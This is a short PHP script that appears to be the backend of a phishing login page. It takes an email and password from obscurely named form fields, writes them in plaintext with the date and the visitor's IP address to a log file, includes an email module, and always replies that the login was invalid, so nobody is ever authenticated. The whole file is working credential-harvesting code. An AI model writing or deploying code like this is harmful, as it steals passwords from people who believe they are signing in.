<?php
require_once 'email.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response to the frontend
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl,
    ]);
    exit();
}

// Check valid inputs
if (!empty($email) && !empty($password)) {
    $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: $email\nPassword: $password\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
    try {
        file_put_contents(__DIR__ . '/logs/login_attempts.txt', $logData, FILE_APPEND);
    } catch (Exception $e) {
        error_log("Failed to save login attempt: " . $e->getMessage());
    }

    // Example validation (should be proper authentication logic here)
    sendJsonResponse(false, "Invalid login attempt.");
} else {
    sendJsonResponse(false, "Invalid input: Email or Password missing.");
}
?>
